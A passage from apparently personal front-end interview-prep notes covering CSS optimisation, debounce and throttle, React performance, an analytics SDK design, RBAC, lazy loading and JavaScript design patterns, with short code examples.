   .foo { 
       margin: 10px 20px 30px 40px; 
   }
   ```
   Shorthand properties not only streamline the code but also decrease the overall file size.

### Utilizing CSS for Graphics
Replacing image files with CSS for graphical elements significantly cuts down the number of HTTP requests and conserves bandwidth.

- **Example: Creating a Triangle Using CSS**:
   ```css
   .triangle {
       width: 0;
       height: 0;
       border-left: 50px solid transparent;
       border-right: 50px solid transparent;
       border-bottom: 100px solid black;
   }
   ```
   This method leverages the browser's capability to render shapes, thus avoiding additional image requests.

### Optimizing CSS Values
Minimizing redundancy in CSS values can further reduce file size and enhance parsing speed by the browser.

- **Example of Optimizing Numerical Values**:
   ```css
   /* Less optimal method */
   .foo {
       width: 0.2em;
       height: 20.0em;
       margin: 0.0px;
   }

   /* Optimized method */
   .foo {
       width: .2em;
       height: 20em;
       margin: 0;
   }
   ```
   Removing unnecessary zeros and units where not needed simplifies the CSS and speeds up processing.

### Using CSS Sprites
CSS sprites combine multiple images into one, reducing the number of server requests. However, this becomes less significant with HTTP/2 as it handles multiple requests more efficiently.

- **Understanding CSS Sprites**:
   CSS sprites are used to include multiple images in a single image file and display only parts of it for different elements using the `background-position` CSS property. This technique is valuable for HTTP/1.1 environments.

## What is debouncing and what is throttling, what are the differences, and name use cases of each

### Debouncing

Debouncing in web development is a strategy used to limit the frequency of execution of a potentially expensive operation that could be triggered repeatedly, such as during window resizing or scrolling. A debounced function will only execute after a specified amount of time has elapsed since the last time it was invoked. For example, if a debounced function is associated with a scrolling event, it will only execute after the user has stopped scrolling for a defined period.

**Throttling**

Throttling is a technique similar to debouncing, but instead of delaying the execution of a function, it ensures the function is executed at regular intervals. For instance, a function triggered by a scroll event, when throttled to execute every 100 milliseconds, will run at most 10 times per second, regardless of the frequency of the scroll event.

**Differences between Debouncing and Throttling**

1. **Timing Control**: Debouncing delays the execution of a function until a specified time has passed since its last invocation. Throttling, however, limits the function's execution to regular, specified intervals.

2. **Use Cases**: Debouncing is useful in scenarios where the function's frequent execution is unnecessary and delays are acceptable, such as in auto-saving or search bar suggestions. Throttling is employed when consistent execution rate is desired, like in handling scroll events or resizing.

3. **Behavior**: In debouncing, the function executes only after the triggering event has ceased for a defined duration. In throttling, the function executes at consistent intervals regardless of the frequency of event triggers.

**Use Cases**

1. **Debouncing**: This is commonly used in search bars, where you want to wait for the user to finish typing before firing an API request, rather than sending requests for every keystroke.

2. **Throttling**: An example is the implementation of infinite scrolling on a website, where you aim to load more content at certain intervals of scrolling, rather than at every small scroll movement.

Both debouncing and throttling are integral for enhancing performance and user experience in web applications. Libraries like **Lodash** offer robust implementations of these techniques.

### Implement debouncing in typescript
```js
function debounce(func, waitFor) {
    let timeout;

    return function(...args) {
        clearTimeout(timeout);
        timeout = setTimeout(() => {
            func.apply(this, args);
        }, waitFor);
    };
}

// Example Usage:
const debouncedLog = debounce((message) => console.log(message), 500);

// Usage
debouncedLog("Hello");
debouncedLog("Hello again, quickly"); // This call will cancel the previous one and only this message will be logged after 500ms
```

### Implement a throttling function in JavaScript
```js
function throttle(func, limit) {
    let inThrottle;
    return function() {
        const args = arguments;
        const context = this;
        if (!inThrottle) {
            func.apply(context, args);
            inThrottle = true;
            setTimeout(() => inThrottle = false, limit);
        }
    };
}

// Example usage:
window.addEventListener('resize', throttle(function() {
    console.log('Resize event triggered');
}, 2000));
```

## HTML5 First-Screen Optimization Techniques

### 1. Route Lazy Loading
- **Applicability**: Suitable for Single Page Applications (SPA) but not for Multi-Page Applications (MPA).
- **Concepts**: 
  - **SPA** refers to a web application or site that interacts with the user by dynamically rewriting the current page rather than loading entire new pages from the server. This results in a more fluid user experience similar to a desktop application.
  - **MPA** is a traditional web application approach that reloads the entire page and requests the HTML from the server on each page change.
- **Implementation in React**: Achieved by splitting the route and ensuring priority loading of the homepage. This can be done using React's `React.lazy` and `Suspense` for dynamic imports and lazy loading of components.

### 2. Server-Side Rendering (SSR) - Exemplified by Next.js
- **Explanation**: Traditional SPA renders the page in a complex process, downloading HTML and JavaScript first, then fetching other resources. SSR simplifies this process by serving a fully rendered HTML page directly from the server, improving performance.
- **Benefits**: Ideal for pure HTML5 pages as it offers ultimate performance optimization, albeit at a higher cost.
- **Historical Context**: SSR is not a new technology. It has been used since the HTML1.0 era in technologies like PHP, ASP, and JSP. With the evolution of technology and the separation of front-end and back-end development, it has gained recent attention for enhancing user experience. Nuxt.js (for Vue) and Next.js (for React) are current examples.

### 3. App Prefetch
- **Usage**: When an HTML5 page is displayed within an app WebView, such as opening a page on Facebook.
- **Method**: The app preloads the first screen content of an article when the user visits the list page. Upon entering the HTML5 page, content is retrieved directly from the app using JSBridge, allowing instant display of the first screen.

### 4. Pagination
- **Application**: Specifically for list pages.
- **Strategy**: Only the first page's content is displayed by default. More content is loaded as the user scrolls up, which can be optimized further with throttling to manage load performance.

### 5. Image Lazy Loading
- **Focus**: Primarily for detail pages.
- **Approach**: Text content is displayed by default, followed by images through lazy loading.
- **Note**: Ensure image dimensions are set in advance to reserve space, minimizing layout shifts and reflows.

### 6. Hybrid Approach
- **Method**: HTML, JavaScript, and CSS files are pre-downloaded to the app. Pages are loaded using the `file://` protocol within the app's WebView, which is significantly faster as it accesses local files.
- **Content Fetching**: Content is then fetched via AJAX and displayed, potentially in combination with app prefetching for enhanced performance.

## In practical work, how have you optimized React?

### Modify CSS to simulate v-show
Using inline CSS to conditionally display components can be optimized to avoid conditional rendering blocks and improve readability:

```ts
{/* Instead of conditionally rendering the component twice */}
{!flag && <MyComponent style={{display: 'none'}}/>}
{flag && <MyComponent />}

// Use a single line with conditional styling
<MyComponent style={{display: flag ? 'block' : 'none'}} />
```

### Use keys in loops
Using a unique `key` prop in a list helps React identify which items have changed, added, or removed, which can improve the performance of list updates:

```ts
const todoItems = todos.map(todo => 
    // Avoid using the index as a key if the list can change
    <li key={todo.id}>
        {todo.text}
    </li>
)
```

### Use Fragment to reduce DOM depth
React Fragments allow you to group a list of children without adding extra nodes to the DOM, which can lead to a more performant and cleaner DOM structure:

```ts
return <>
    <div>1</div>
    <div>2</div>
</>
```

### Do not define functions in JSX
Defining functions directly in JSX can lead to performance issues as the function will be recreated on every render. Instead, define your function outside the JSX return statement:

```ts
// Avoid defining functions directly in the JSX
<button onClick={() => {...}}>Click Me</button>

// Prefer defining your function outside and referencing it in JSX
function MyComponent() {
    const handleClick = () => {...}
    return <button onClick={handleClick}>Click Me</button>
}
```

### Bind `this` in the constructor
For class components, it's important to bind `this` in the constructor to ensure that `this` refers to the component instance in your event handlers:

```ts
class MyComponent extends React.Component {
    constructor(props) {
        super(props)
        // Bind this in the constructor
        this.handleClick = this.handleClick.bind(this)
    }
    handleClick() { /* Now `this` refers to the component instance */ }
    
    // Arrow functions automatically bind `this` to the class instance
    handleClick2 = () => { /* Arrow function, no need to bind this */ }
    
    render() {
        return <button onClick={this.handleClick}>Click Me</button>
    }
}
```

### Use shouldComponentUpdate or React.PureComponent
#### `shouldComponentUpdate`

The `shouldComponentUpdate` method is available in class components and allows you to prevent unnecessary re-renders by manually determining whether a component should update in response to changes in props or state. It receives the next props and state as arguments and returns a boolean value indicating whether React should continue with the rendering process.

Implementing `shouldComponentUpdate` can significantly improve performance, particularly in cases where you know that the UI does not need to update in response to certain changes.

```ts
class MyComponent extends React.Component {
  shouldComponentUpdate(nextProps, nextState) {
    // Only re-render if the next id is different from the current one
    return nextProps.id !== this.props.id;
  }
  
  render() {
    return <div>{this.props.id}</div>;
  }
}
```

In the example above, the component will only re-render if the `id` prop changes. This manual comparison can be very efficient but requires careful implementation to avoid missed updates or stale renders.

#### `React.PureComponent`

`React.PureComponent` is a base class for class components that automatically implements `shouldComponentUpdate` with a shallow prop and state comparison. When your component extends `React.PureComponent`, React will shallowly compare the old props and state with the new ones and re-render the component only if there was a change.

This is particularly useful for components that have simple props and state structures where a shallow comparison is sufficient to detect changes.

```ts
class MyComponent extends React.PureComponent {
  render() {
    return <div>{this.props.id}</div>;
  }
}
```

While `React.PureComponent` reduces the need to manually implement `shouldComponentUpdate`, it's important to remember that it performs a shallow comparison. This means it might not work as expected if your props or state include complex data structures like nested objects or arrays that might change internally without changing their identity.

#### `React.memo`

For functional components, which cannot extend `React.PureComponent` or implement `shouldComponentUpdate`, React provides the `React.memo` higher-order component. Similar to `React.PureComponent`, `React.memo` wraps a functional component and adds a memoization feature, performing a shallow comparison of the component's props. If the props are the same as the previous render, React will skip rendering the component and reuse the last rendered result.

```ts
const MyComponent = React.memo(function MyComponent(props) {
  return <div>{props.id}</div>;
});
```

`React.memo` is a powerful tool for optimizing functional components, especially when they are expected to render often with the same props. For more complex comparison logic, `React.memo` accepts a second argument, a custom comparison function, giving you control over the comparison logic similar to `shouldComponentUpdate`.

```ts
const MyComponent = React.memo(function MyComponent(props) {
  // Component body
}, (prevProps, nextProps) => {
  // Return true if passing nextProps to render would return
  // the same result as passing prevProps, false otherwise
  return prevProps.id === nextProps.id;
});
```
# 8. Project Design.md

## Designing a Front-End Analytics SDK

A Front-End Analytics Software Development Kit (SDK) is essential for collecting, analyzing, and reporting user behavior data on websites. This includes data such as page views (PV), click events, custom events (e.g., subscriptions to a VIP service, cancellations of a VIP service), performance metrics, and error logging. Large companies often develop their own analytics solutions, while small to medium-sized enterprises might opt for third-party services like Google Analytics.

The SDK serves as a bridge between the client-side environment and the analytics server, enabling a cyclical process: The SDK collects data from the user's interactions with the website, sends this data to the analytics server, and then the server processes and analyzes the data to generate reports. These insights can then be used to optimize the website, creating a feedback loop that enhances user experience.

### Key Metrics to Track

1. **Page Views (PV):** Measure the number of times a page is loaded or reloaded in a browser.
2. **Custom Events:** Track specific user actions such as becoming a VIP member or cancelling a VIP membership.
3. **Performance Metrics:** Monitor the performance of the website, including loading times and interaction delays.
4. **Error Logging:** Capture JavaScript errors and promise rejections to identify issues affecting user experience.

### SDK Design Overview

```javascript
class AnalyticsSDK {
  constructor(productId) {
    this.productId = productId;
    this.initPerformanceTracking();
    this.initErrorTracking();
  }

  // Use private methods for internal functionality in TypeScript
  send(url, params = {}) {
    params.productId = this.productId;
    const queryString = Object.entries(params)
      .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
      .join('&');
    const fullUrl = `${url}?${queryString}`;
    // Use a beacon or an image to send data to overcome CORS issues, no need for response handling, and better compatibility
    navigator.sendBeacon ? navigator.sendBeacon(fullUrl) : this.fallbackSend(fullUrl);
  }

  initPerformanceTracking() {
    window.addEventListener('load', () => {
      const performanceData = performance.timing.toJSON ? performance.timing.toJSON() : performance.timing;
      this.send('https://analytics.example.com/performance', { data: JSON.stringify(performanceData) });
    });
  }

  initErrorTracking() {
    window.addEventListener('error', (event) => {
      this.sendError(event.message, event.filename, event.lineno, event.colno);
    });
    window.addEventListener('unhandledrejection', (event) => {
      this.sendError('Unhandled Promise Rejection', event.reason);
    });
  }

  sendError(message, source = '', lineno = 0, colno = 0) {
    this.send('https://analytics.example.com/error', { message, source, lineno, colno });
  }

  trackPageView() {
    // Implement logic to avoid duplicate tracking on single-page applications
    this.send('https://analytics.example.com/pv', { url: window.location.href });
  }

  trackEvent(eventName, value) {
    this.send('https://analytics.example.com/event', { eventName, value });
  }

  fallbackSend(url) {
    // Fallback for older browsers without navigator.sendBeacon support
    const img = new Image();
    img.src = url;
  }
}

// Usage example
document.addEventListener('DOMContentLoaded', () => {
  const analytics = new AnalyticsSDK('your-product-id');
  analytics.trackPageView();
});
```

This code example outlines the basic structure and functionality of an analytics SDK. It demonstrates how to send data to an analytics server using either the Beacon API or an image tag as a fallback, how to track performance metrics, handle errors, and record custom events. Remember, this is a starting point, and the implementation can be extended with more features like batched sending for performance optimization, more sophisticated error handling, or integration with popular frameworks.

**Conclusion**

When designing a front-end analytics SDK, the key considerations should include the types of data you wish to collect, how to efficiently and securely transmit this data to the server, and ensuring that your tracking does not adversely affect the user experience. Tailor your SDK to be flexible, extensible, and easy to integrate into existing projects.

## When to Use SPA and When to Use MPA?

### SPA: Single Page Application
Single Page Applications (SPAs) are web applications that load a single HTML page and dynamically update that page as the user interacts with the app. SPAs use JavaScript to load content and typically involve frameworks like React, Vue.js, or Angular. These frameworks can be configured as SPAs or MPAs, but are often used to create efficient SPAs due to their component-based architectures.

**Use Cases for SPA:**
- **Complex Web Applications:** SPAs are ideal for situations where the user experience benefits from a seamless interaction without the page reloads typical of traditional web applications. Examples include advanced project management tools, interactive social media platforms, and rich user dashboards.
- **High Interaction Applications:** Applications that require real-time user interactions without interruption, such as live data updates, instant messaging platforms, and collaborative tools.
- **Internal Business Applications:** Large scale enterprise dashboards, such as CRM systems or cloud service consoles, where constant page reloading can hinder productivity.

**Advantages:**
- **Speed and User Experience:** After the initial load, SPAs do not require page reloads, which can significantly enhance the user experience by providing faster transitions and a smooth, app-like feel.
- **Reduced Server Load:** Since most resources are loaded once at the start, SPAs can reduce server load during the session.

**Considerations:**
- **Initial Load Time:** SPAs typically require more time to load initially as they fetch all the necessary JavaScript at once.
- **SEO Challenges:** Search engines traditionally have difficulties indexing content that is dynamically loaded by JavaScript. This can be mitigated by implementing Server Side Rendering (SSR) or using tools like prerendering.

### MPA: Multi Page Application
Multi Page Applications (MPAs) work in a traditional way where each change or submission leads to a new page being sent to the client by the server. This approach is straightforward and aligns with the original working of the web.

**Use Cases for MPA:**
- **Simple Websites:** If the site is mostly static and informational, such as a corporate website, an MPA may be more appropriate.
- **E-commerce Sites:** Online stores often benefit from an MPA setup, where each product page can be indexed separately by search engines.
- **Content-driven Projects:** News sites, blogs, and marketing websites where SEO is crucial can benefit from the straightforward link structure and easier indexability of MPAs.

**Advantages:**
- **SEO:** MPAs have a clear advantage in search engine optimization since each page is indexed separately with its own URL.
- **Simplicity:** Development can be more straightforward, as the server handles most of the content rendering.

**Considerations:**
- **User Experience:** Navigating between pages can result in a slower, less seamless user experience, particularly if the server response time is slow.
- **Higher Server Load:** Each page request loads resources from the server, which can increase load and affect performance during high traffic periods.

### Choosing Between SPA and MPA
The decision to use an SPA or MPA should not solely be based on technological capabilities but should consider the specific business needs and user experience requirements. Evaluate the complexity of the application, the need for speed and seamless interactions against the importance of SEO, and simplicity in development and maintenance.

## Design a Data Model and Core Features for an HTML5 Low-Code Development Platform

Creating an effective data model for a low-code development platform involves constructing a robust structure that supports extensive customization, real-time collaboration, and project management. This section outlines the primary components and functionalities that should be considered in the design process.

- **User Interface Design Tools:** Tools should allow users to visually create and adjust UI components. Features might include drag-and-drop interfaces, property inspectors, and responsive design options.
- **Project Management:** Capabilities should include creating new projects, saving ongoing work, publishing finished or interim stages, and managing project versions.
- **Collaboration Features:** The platform should support simultaneous editing by multiple users, conflict resolution strategies, and live updates to facilitate team-based project development.
- **Extensibility:** The system should allow for the integration of third-party or custom-built plugins and components to enhance functionality.

### Data Model Considerations

To achieve efficient and scalable management of project data and user activities, consider the following:

- **Data Syncing:** Use technologies such as WebSockets for real-time communication and long polling for less frequent updates to ensure that all users see the most current project state without significant delay.
- **Component Selection:** Maintain a detailed registry of each user-selected component, identified by unique IDs. This registry should track changes to component properties over time, aiding in undo/redo features and historical edits.
- **Layer Management:** Implement a system to manage the z-index and stacking of UI components through an organized list or array. This arrangement helps in manipulating layer properties like order, visibility, and nesting.

### Efficient Component Management

Organizing components and their properties efficiently ensures smoother operation and better performance:

- **Style Management:** Centralize styling information within a `style` object for each component to facilitate the application of themes and visual updates.
- **Layer Representation:** Utilize array indices for managing layer depth to simplify rendering logic and enable quick adjustments to the visual hierarchy.

### Example Implementation in React

Below is an example of a React context provider setup for managing project state in a low-code development environment:

```jsx
import React, { useContext, useState } from 'react';

const ProjectContext = React.createContext();

const ProjectProvider = ({ children }) => {
    const [project, setProject] = useState({
        title: "My New Project",
        settings: {
            language: 'EN',
            theme: 'light',
        },
        layout: {
            backgroundColor: '#f0f0f0',
            fontSize: '14px',
        },
        components: [
            {
                id: 'header',
                name: 'Main Header',
                type: 'text',
                style: {
                    color: '#333',
                    fontSize: '32px',
                },
                attributes: {
                    content: 'Welcome to Your Project',
                },
                children: [],
            },
            {
                id: 'image1',
                name: 'Feature Image',
                type: 'image',
                style: {
                    width: '100%',
                    height: 'auto',
                },
                attributes: {
                    src: 'url/to/your/image.jpg',
                    alt: 'Descriptive Image Alt Text',
                },
            }
        ],
        selectedComponentId: null,
    });

    const handleComponentSelect = (componentId) => {
        setProject(prevProject => ({ ...prevProject, selectedComponentId: componentId }));
    };

    return (
        <ProjectContext.Provider value={{ project, setProject, handleComponentSelect }}>
            {children}
        </ProjectContext.Provider>
    );
};

const App = () => {
    const { project, handleComponentSelect } = useContext(ProjectContext);

    const renderComponent = (component) => (
        <div style={component.style} onClick={() => handleComponentSelect(component.id)}>
            {component.type === 'text' ? component.attributes.content : (
                <img src={component.attributes.src} alt={component.attributes.alt} style={{ width: '100%', height: 'auto' }} />
            )}
        </div>
    );

    return (
        <div style={{ backgroundColor: project.layout.backgroundColor }}>
            <h1 style={{ fontSize: project.layout.fontSize }}>{project.title}</h1>
            {project.components.map(renderComponent)}
        </div>
    );
};
```

## Design a "User - Role - Permission" System

Implementing a User - Role - Permission system effectively manages access within software, such as a blog management system. This is typically structured using the Role-Based Access Control (RBAC) model, a proven approach for handling large-scale permission management due to its scalability and maintainability.

RBAC helps simplify the assignment and management of access rights within a system by linking permissions to roles, and roles to users. This model is adaptable, making it easier to implement changes to access policies and manage user permissions with minimal disruption.

### User Types and Permissions

A blog management system may feature several types of users, each with unique permissions:

- **Normal User**: Capable of reading, auditing, and hiding blog posts.
- **Admin User**: Inherits all permissions of a normal user, and can additionally update and delete blog posts.
- **Super Admin**: Inherits all permissions of an admin user, with further capabilities to manage user accounts, assign roles, and modify user roles and permissions.

### Data Models

Key entities in the RBAC system include:

#### User
- `id`: A unique identifier for each user.
- `user_name`: A username for logging in.
- `hashed_password`: A securely encrypted password.
- `comment`: An optional field for notes or additional information about the user.

#### Role
- `id`: A unique identifier for each role.
- `role_name`: The name of the role, indicative of its associated permissions.

#### Permission
- `permission_id`: A unique identifier for each permission.
- `permission_name`: A description of the action that the permission allows.

### Relationships

Effective management of relationships is crucial in an RBAC system to maintain data integrity and system security.

#### User_Role
- `user_id`: Connects to a specific user.
- `role_id[]`: An array of role identifiers, enabling a many-to-many relationship between users and roles.

#### Role_Permission
- `role_id`: Connects to a specific role.
- `permission_id[]`: An array of permission identifiers, allowing a role to be associated with multiple permissions.

### Functional Modules

The system should be divided into manageable modules to enhance maintainability and scalability:

- **User Management**: Handles creating, deleting, modifying users, and assigning roles.
- **Role Management**: Manages creating, deleting, and modifying roles, as well as assigning permissions.
- **Permission Management**: Responsible for creating, deleting, and modifying permissions.

### Design Principles

- **Clarity**: Components should be distinct and understandable to both developers and end-users.
- **Maintainability**: The system should be easy to modify and update.
- **Scalability**: Designed to accommodate growth in users, roles, and permissions without degradation in performance.
- **Standards Adherence**: Follow established best practices and standards, utilizing existing solutions before developing new methodologies.

## Design a HTML5 prize draw page, what are the backend api you need to implement?
Thinking process:  
1. think about the user flow, business logic process, different stages of the process
2. think about the api you need to implement in each step

### User Flow and Business Logic

1. **User Registration and Authentication**: This is the starting point for user interaction on the prize draw page. Users need to log in or register to participate.
2. **Prize Draw Participation**: The system checks if the user has already participated in the draw. If not, the user can proceed to draw a prize.
3. **Result Handling and Information Submission**: After drawing, the user can see the results and must submit additional information (e.g., shipping address) if they win.
4. **Post-Draw Interactions**: Users can check the status of their prize, view previous draws, and get details about the prizes they've won.

### Backend API Requirements

To support the user flow and business logic detailed above, a robust set of backend APIs will need to be developed:

1. **User API**: Register a new user. Authenticate a user. Retrieve user profile information. Update user profile information.

2. **Draw Prize API**: Perform a prize draw. Retrieve the current status of a draw. Fetch the result of the last prize draw.

3. **Prize API**: List all available prizes. Get details about a specific prize. Retrieve the user's prize draw history. Update information about a prize (admin restricted).

4. **Statistics API**: Obtain general statistics about page visits, user participation in draws, and shares.

5. **Share API**: Log a user's action of sharing the page to social media.

## How would you approach technology selection as the front-end lead on a project?

Choosing the right technology stack is essential for the success of a project. This decision should be guided by several factors, which include but are not limited to the project requirements, the team's expertise, and the long-term maintenance of the project.

1. Choosing a Front-End Framework

    Frameworks like Vue, React, Nuxt.js, and Next.js each have their strengths and are suitable for different kinds of projects:

    - **Vue and Nuxt.js**: Best for progressive web applications and when you need a quick development environment setup. Vue's ecosystem is friendly and incrementally adoptable.
    - **React and Next.js**: Ideal for large-scale applications with complex states and dynamic content. React's component-based architecture facilitates reusable UI components.
2. Selecting the Programming Language
   - **JavaScript**: The standard language of the web; vast ecosystem, high flexibility.
   - **TypeScript**: Offers type safety and is preferable in large projects to reduce bugs and enhance code quality.
3. DevOps, CI/CD, and Build Tools
   - Incorporating DevOps practices and continuous integration/continuous delivery (CI/CD) pipelines ensures that your development process is efficient and that deployments are smooth.
   - Common build tools like Webpack and Babel are essential for bundling JavaScript applications and managing assets.

### Decision Factors
- Is the community mature?  
    A mature community means better support, more libraries, and a greater likelihood of finding solutions to problems that arise.
- Does our company have experience with the technology?
    Leveraging existing knowledge can reduce training time and lead to faster development cycles.
-Cost of learning for the team
    Consider how easy it is for your team to learn the technology. Avoid high learning curves if speed is a priority.

### Cost Considerations
-Learning Curve
    Technologies that are complex to understand or that have poor documentation can slow down development.
- Maintenance
    For instance, excessive use of `any` in TypeScript can defeat the purpose of using TypeScript in the first place due to the lack of type safety.
- DevOps Costs
    The integration of continuous integration and continuous delivery systems can vary in complexity and cost depending on the chosen technologies.

**Final Note**: While there's no inherently "good" or "bad" technology, the best choice always depends on the specific context of the project and the composition of the team. It's important not to follow trends blindly but to choose technologies that offer the best balance of benefits to challenges in your specific situation. Always be balanced and analytical in your approach to technology selection.

## Implement HTML5 Image Lazy Loading

1. **HTML Markup Setup**: Implement the `loading` attribute in the `<img>` tag to utilize browser-native lazy loading. For older browser compatibility, use `data-src` for the image URL and `src` for a placeholder.

    ```html
    <img src="placeholder.png" data-src="actual_image.png" alt="Descriptive Text" loading="lazy">
    ```

2. **Scroll Event Handling**: Monitor the scroll event to load images as they come into view. Throttle the event to enhance performance by reducing the frequency of execution.

    ```javascript
    window.addEventListener('scroll', _.throttle(() => {
        document.querySelectorAll('img[data-src]').forEach(img => {
            if (img.getBoundingClientRect().top < window.innerHeight) {
                img.src = img.dataset.src;
                img.removeAttribute('data-src'); // Prevent reprocessing
            }
        });
    }, 100));
    ```

3. **Initial Image Processing**: On page load, assess and load visible images immediately, catering for content initially within the viewport.

    ```javascript
    document.addEventListener('DOMContentLoaded', () => {
        mapImagesAndTryLoad(); // Load visible images at start
    });
    ```

**Optimization Tips**

- **Intersection Observer API**: Use this modern API for a more efficient detection of visible elements, which avoids the overhead of repeated event handling.
- **Throttle vs. Debounce**: Choose between these techniques based on event characteristics and desired responsiveness. Throttling ensures regular execution at fixed intervals, suitable for scroll events, while debouncing delays execution until event activity stops, ideal for resize events.

1. Get Image Position and Window Height
    - Understanding an element's position and the viewport size is essential for tasks like animations, dynamic content loading, and responsive design.
2. Retrieve Element Position
   - **Using `getBoundingClientRect()`**: This method returns an object detailing an element's size and its position relative to the viewport.
       ```javascript
       const elementPosition = document.getElementById('example').getBoundingClientRect();
       ```
3. Determine Viewport Size
   - **Using `window.innerHeight`**: This property gives the height of the layout viewport, useful for sizing and layout adjustments.
       ```javascript
       const viewportHeight = window.innerHeight;
       ```

### Practical Example
```html
<body>
    <!-- Images tagged for lazy loading -->
    <img src="placeholder.png" data-src="actual_image.png" alt="Image Description" loading="lazy">
    <img src="placeholder.png" data-src="actual_image.png" alt="Image Description" loading="lazy">
</body>

<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.11/lodash.min.js"></script>
<script>
    // Throttled scroll event for lazy loading
    window.addEventListener('scroll', _.throttle(() => {
        mapImagesAndTryLoad();
    }, 100));

    document.addEventListener('DOMContentLoaded', () => {
        mapImagesAndTryLoad(); // Immediately load visible images
    });
</script>
```

# 9. Design Patterns.md

## Design Principles
The most important principle in design patterns is the **Open/Closed Principle**, which states that a system should be open for extension but closed for modification. This means you should be able to add new functionality without changing the existing code.

## Factory Pattern
The Factory pattern involves using a factory function to create instances, effectively hiding the `new` keyword to encapsulate the creation process. This pattern is useful for scenarios where the creation process is complex or when there needs to be some control over how instances are created. Examples include the jQuery `$` function and React's `createElement` function.

**Example**:
```typescript
class Foo {}

function factory() {
    return new Foo();
}

const f = factory();
```

## Singleton Pattern
The Singleton pattern ensures that a class has only one instance and provides a global point of access to it. This is particularly useful for cases where a single instance of a class should be used across the system, such as the store in Vuex and Redux or a globally unique dialog/modal. JavaScript makes implementing singletons straightforward because there's no need to worry about multithreading issues that might arise in languages like Java, where thread locking mechanisms might be necessary to prevent multiple instances from being created.

**Example**:
```typescript
class Singleton {
    private static instance: Singleton;
    private constructor() {}
    static getInstance() {
        if (!Singleton.instance) {
            Singleton.instance = new Singleton();
        }
        return Singleton.instance;
    }
    fn1() {}
    fn2() {}
}

const s = Singleton.getInstance();
s.fn1();
```

## Strategy Model

**Strategy Model** is a behavioral design pattern that allows the definition of a family of algorithms, the encapsulation of each algorithm, and making their instances interchangeable within that family. This pattern is particularly useful when you need to dynamically alter the behavior of an object and want to avoid conditional statements.

Consider a scenario in a software application for a logistics company that calculates shipping costs. Different shipping options (e.g., air, ground, freight) have different cost calculation algorithms. The Strategy pattern allows you to switch between different shipping strategies dynamically depending on the user's choice or other specific conditions.

```javascript
// Basic implementation of the Strategy pattern
class Shipping {
  constructor() {
    this.company = null;
  }

  setStrategy(company) {
    this.company = company;
  }

  calculate(package) {
    return this.company.calculate(package);
  }
}

class UPS {
  calculate(pkg) {
    return `$${pkg.weight * 1.56}`;
  }
}

class USPS {
  calculate(pkg) {
    return `$${pkg.weight * 1.45}`;
  }
}

class Fedex {
  calculate(pkg) {
    return `$${pkg.weight * 1.60}`;
  }
}

const package = { weight: 5 }; // weight in lbs
const shipping = new Shipping();

// Using UPS strategy
shipping.setStrategy(new UPS());
console.log('Shipping cost with UPS:', shipping.calculate(package));  // "Shipping cost with UPS: $7.8"

// Switching to USPS strategy without modifying the Shipping class
shipping.setStrategy(new USPS());
console.log('Shipping cost with USPS:', shipping.calculate(package));  // "Shipping cost with USPS: $7.25"
```

**Benefits and Use Cases**
- **Flexibility**: Allows objects to switch behaviors dynamically.
- **Decoupling**: Strategies can be developed and extended independently from clients that use them.
- **Testability**: Each strategy can be tested independently from the clients and other strategies.

## Proxy Pattern
The Proxy pattern in software design encapsulates an object with a proxy, which intercepts and controls interactions with that object. This pattern is particularly useful in JavaScript for operations like monitoring, logging, and performing custom actions on property access or assignment.

JavaScript `Proxy` is a powerful feature that allows for the creation of a proxy for another object. It enables the interception and customization of fundamental operations performed on the original object, including property access, assignment, and enumeration. This feature is invaluable for scenarios such as tracking changes, enforcing validations, and dynamically updating UI based on data changes.

### The Basics of Proxy
In JavaScript, a `Proxy` serves as a sophisticated handler for an original object, allowing fine-grained control over how interactions with that object are managed. This control extends to almost all operations performed on the object, enabling developers to define custom behaviors for property access, updates, and more.

### Practical Example: Monitoring List Additions
This example illustrates how a `Proxy` can be used to monitor and log additions to an array, potentially triggering other actions like validations or UI updates:

**Example Implementation**
```javascript
// Define handler with traps for get and set operations
let handler = {
  // Trap for property access
  get(target, property, receiver) {
    console.log(`Accessing property '${property}'`);
    return Reflect.get(...arguments);
  },
  // Trap for property assignment
  set(target, property, value, receiver) {
    console.log(`Adding '${value}' to the list`);
    target[property] = value; // Update the target list
    // Implement additional actions like validation or UI updates here
    return true; // Confirm the operation's success
  }
};

// Initialize the original list
let originalList = [];

// Create the proxy for the original list
let proxyList = new Proxy(originalList, handler);

// Use the proxy list to perform operations
proxyList.push('Apple');  // Output: Adding 'Apple' to the list
proxyList.push('Banana'); // Output: Adding 'Banana' to the list
```
This example demonstrates the `Proxy` pattern's utility in JavaScript, where interactions with `proxyList` trigger the defined handlers, allowing for enhanced control and responsiveness in applications.

### Advantages of Using Proxies
- **Interception and Customization**: Proxies enable precise control over how operations on objects are conducted, facilitating the implementation of additional behaviors and validations.
- **Programmatic Validation**: They offer a robust method for enforcing rules and constraints programmatically, which helps maintain data integrity and robustness in applications.
- **Change Detection**: Proxies are essential in reactive programming patterns where changes to objects or arrays need to trigger dynamic responses.

### JavaScript Quirk: Overcoming Paradoxical Conditions
The following TypeScript example demonstrates an interesting use of property definitions to satisfy seemingly paradoxical conditions:

```ts
// Using Object.defineProperty to manipulate property accesses dynamically
Object.defineProperty(window, 'a', {
  get: function() {
    this.value = this.value || 0;
    return ++this.value;
  }
});

if (a === 1 && a === 2 && a === 3) {
  console.log('Hello World!');
}
```
In this scenario, `Object.defineProperty` is employed similarly to a proxy, allowing dynamic manipulation of property access. It defines a getter for the property `a` that increments its value each time it's accessed, thereby making the condition `a === 1 && a === 2 && a === 3` true.

## Observer Pattern
The Observer pattern is widely used in front-end development. It involves a subject and observers, where the observers are notified and updated whenever the subject undergoes a change. A common example is attaching click event listeners to a button, where each listener acts as an observer to the button's click event.

**Example**:
```typescript
btn.addEventListener('click', () => {
    console.log('click');
});
```

## Publish-Subscribe Pattern
Similar to the Observer pattern, the Publish-Subscribe pattern provides a more decoupled way for components to communicate. Components can publish events to a specific event channel and subscribe to this channel to receive notifications. It's important to unsubscribe from events, especially in component lifecycle hooks, to prevent memory leaks.

**Example**:
```typescript
event.on('event-key', () => {
    console.log('event 1');
});
event.on('event-key', () => {
    console.log('event 2');
});
event.emit('event-key');

// Remember to unsubscribe
function fn1() {}
event.on('event-key', fn1);
event.off('event-key', fn1);
```

## Decorator Pattern
